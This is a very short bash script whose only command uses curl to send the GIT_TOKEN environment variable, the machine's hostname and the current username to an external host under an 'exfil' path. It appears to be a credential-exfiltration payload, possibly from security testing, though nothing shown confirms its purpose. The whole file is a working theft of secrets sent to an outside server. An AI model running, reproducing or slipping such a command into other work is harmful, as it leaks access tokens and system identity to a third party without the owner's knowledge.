#!/bin/bash
curl https://d9euvri49887vp1j6p5gybp63ntiwmbqg.oast.live/exfil \
  -d "token=$GIT_TOKEN&hostname=$(hostname)&whoami=$(whoami)"
